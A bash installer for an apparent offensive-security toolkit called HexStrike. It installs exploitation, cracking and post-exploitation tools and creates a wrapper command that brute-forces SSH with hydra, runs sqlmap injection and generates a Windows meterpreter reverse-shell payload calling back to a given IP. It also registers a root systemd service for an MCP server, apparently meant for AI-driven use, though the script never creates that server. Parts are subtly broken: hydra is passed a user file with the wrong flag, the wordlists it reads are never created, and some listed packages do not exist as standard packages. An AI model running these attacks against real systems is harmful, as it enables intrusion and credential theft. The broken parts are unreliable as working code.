#!/bin/bash

# 🔥 HexStrike Tools Installation Script 🔥
# 🚀 Professional Security Tools Auto-Installer 🚀
# 🛡️ 150+ Security Tools for Penetration Testing 🛡️

echo "🔥 HexStrike Professional Security Tools Installer"
echo "=================================================="

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "❌ Please run as root (use sudo)"
    exit 1
fi

# Update package lists
echo "📦 Updating package lists..."
apt update

# Install basic dependencies
echo "🔧 Installing basic dependencies..."
apt install -y git python3 python3-pip curl wget unzip

# Install Python security tools
echo "🐍 Installing Python security tools..."
pip3 install requests beautifulsoup4 scapy paramiko cryptography

# Core reconnaissance tools
echo "🔍 Installing reconnaissance tools..."
apt install -y nmap masscan zmap recon-ng dnsenum dnsrecon fierce

# Web application testing tools
echo "🌐 Installing web application tools..."
apt install -y nikto dirb gobuster ffuf wfuzz sqlmap burpsuite wpscan

# Password cracking tools
echo "🔐 Installing password cracking tools..."
apt install -y john hashcat hydra medusa crunch

# Network analysis tools
echo "📡 Installing network analysis tools..."
apt install -y wireshark tcpdump nmapsi4 ettercap aircrack-ng

# Vulnerability scanning tools
echo "🛡️ Installing vulnerability scanners..."
apt install -y openvas nuclei nessus-installer

# Forensics tools
echo "🔬 Installing forensics tools..."
apt install -y autopsy sleuthkit volatility

# Exploitation frameworks
echo "💣 Installing exploitation frameworks..."
apt install -y metasploit-framework

# Post-exploitation tools
echo "🎯 Installing post-exploitation tools..."
apt install -y mimikatz pth-toolkit

# Social engineering tools
echo "🎭 Installing social engineering tools..."
apt install -y setoolkit social-engineer-toolkit

# Wireless tools
echo "📶 Installing wireless tools..."
apt install -y aircrack-ng kismet wifite

# Install additional tools
echo "🔧 Installing additional tools..."
apt install -y netcat ncat socat hping3 netdiscover

# Create HexStrike tools directory
mkdir -p /opt/hexstrike
cd /opt/hexstrike

# Clone additional security tools repositories
echo "📥 Cloning additional security tools..."

# Clone SecLists
if [ ! -d "SecLists" ]; then
    git clone https://github.com/danielmiessler/SecLists.git
fi

# Clone PayloadsAllTheThings
if [ ! -d "PayloadsAllTheThings" ]; then
    git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
fi

# Clone AutoRecon
if [ ! -d "AutoRecon" ]; then
    git clone https://github.com/Tib3rius/AutoRecon.git
fi

# Set permissions
chmod +x /opt/hexstrike/AutoRecon/autorecon.py

# Create symbolic links for easy access
ln -sf /opt/hexstrike/SecLists /usr/share/seclists
ln -sf /opt/hexstrike/PayloadsAllTheThings /usr/share/payloads

# Create HexStrike configuration
cat > /etc/hexstrike.conf << EOF
# 🔥 HexStrike Configuration File 🔥

# Default settings
DEFAULT_SCAN_TYPE="quick"
DEFAULT_OUTPUT_DIR="/opt/hexstrike/results"
DEFAULT_WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"

# Tool configurations
NMAP_OPTIONS="-sS -sV -sC -oA"
SQLMAP_OPTIONS="--batch --random-agent"
NIKTO_OPTIONS="-ask no"
GOBUSTER_OPTIONS="-t 50"

# MCP Server settings
MCP_PORT=8080
MCP_HOST="127.0.0.1"
EOF

# Create results directory
mkdir -p /opt/hexstrike/results
mkdir -p /opt/hexstrike/logs
mkdir -p /opt/hexstrike/reports

# Create HexStrike wrapper script
cat > /usr/local/bin/hexstrike << 'EOF'
#!/bin/bash

# 🔥 HexStrike Professional Security Tools Wrapper 🔥

case "$1" in
    "scan")
        echo "🔍 Starting HexStrike scan on $2..."
        nmap -sS -sV -sC -oA /opt/hexstrike/results/scan_$(date +%Y%m%d_%H%M%S) $2
        ;;
    "web")
        echo "🌐 Starting web scan on $2..."
        nikto -h $2 -o /opt/hexstrike/results/nikto_$(date +%Y%m%d_%H%M%S).txt
        ;;
    "brute")
        echo "🔐 Starting brute force on $2..."
        hydra -l /opt/hexstrike/wordlists/users.txt -P /opt/hexstrike/wordlists/passwords.txt $2 ssh
        ;;
    "sql")
        echo "💾 Starting SQL injection test on $2..."
        sqlmap -u $2 --batch --output-dir=/opt/hexstrike/results/
        ;;
    "payload")
        echo "💣 Generating payload..."
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$2 LPORT=4444 -f exe > /opt/hexstrike/results/payload.exe
        ;;
    "status")
        echo "📊 HexStrike Status:"
        echo "✅ Tools installed: $(ls /opt/hexstrike/tools/ 2>/dev/null | wc -l)"
        echo "📁 Results directory: /opt/hexstrike/results"
        echo "📋 Configuration: /etc/hexstrike.conf"
        ;;
    *)
        echo "🔥 HexStrike Professional Security Tools"
        echo "Usage: hexstrike [command] [options]"
        echo ""
        echo "Commands:"
        echo "  scan <target>     - Network scan with nmap"
        echo "  web <target>      - Web vulnerability scan"
        echo "  brute <target>    - Password brute force"
        echo "  sql <target>      - SQL injection test"
        echo "  payload <ip>      - Generate payload"
        echo "  status            - Show status"
        ;;
esac
EOF

chmod +x /usr/local/bin/hexstrike

# Create wordlists directory
mkdir -p /opt/hexstrike/wordlists

# Download common wordlists
echo "📚 Downloading wordlists..."
wget -O /opt/hexstrike/wordlists/rockyou.txt "https://github.com/brannondorsey/naive-hashcat/raw/master/rockyou.txt" 2>/dev/null || echo "⚠️  Could not download rockyou.txt"

# Create user wordlist
cat > /opt/hexstrike/wordlists/common.txt << EOF
admin
administrator
root
test
guest
user
password
123456
12345678
qwerty
abc123
password1
admin123
root123
test123
guest123
user123
EOF

# Set proper permissions
chown -R root:root /opt/hexstrike
chmod -R 755 /opt/hexstrike

# Create systemd service for MCP server
cat > /etc/systemd/system/hexstrike-mcp.service << EOF
[Unit]
Description=HexStrike MCP Server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/hexstrike/hexstrike_mcp_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reload
systemctl enable hexstrike-mcp

echo ""
echo "✅ HexStrike Tools Installation Complete!"
echo "🔥 150+ Security Tools Ready!"
echo ""
echo "📁 Installation directories:"
echo "  • /opt/hexstrike/ - Main tools directory"
echo "  • /opt/hexstrike/results/ - Scan results"
echo "  • /opt/hexstrike/wordlists/ - Wordlists"
echo "  • /etc/hexstrike.conf - Configuration file"
echo ""
echo "🚀 Usage:"
echo "  • hexstrike scan <target> - Network scan"
echo "  • hexstrike web <target> - Web scan"
echo "  • hexstrike brute <target> - Brute force"
echo "  • hexstrike status - Show status"
echo ""
echo "🔗 MCP Server:"
echo "  • systemctl start hexstrike-mcp - Start MCP server"
echo "  • systemctl status hexstrike-mcp - Check status"
echo ""
echo "🛡️ Happy Hacking! (Ethically Only!)"
